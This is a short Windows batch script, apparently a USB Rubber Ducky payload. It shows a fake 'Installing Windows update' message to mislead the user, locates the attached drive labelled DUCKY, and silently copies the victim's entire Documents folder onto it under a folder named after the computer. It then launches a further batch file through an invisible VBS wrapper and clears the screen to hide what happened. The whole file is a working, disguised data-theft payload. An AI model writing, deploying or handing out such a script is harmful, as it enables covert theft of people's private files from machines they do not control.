@echo off
@echo Installing Windows update
for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%%A:)

set destination=%DUCKYdrive%\%COMPUTERNAME%

:while2
if Exist %destination% (
set destination=%destination%_next
goto :while2
) else (
goto :break2
)

:break2

mkdir %destination%

if Exist %USERPROFILE%\Documents (
xcopy %USERPROFILE%\Documents %destination% /S /E >>nul
)
cd /d %temp% 
wscript.exe invis.vbs duckyreplay.bat

cls
exit
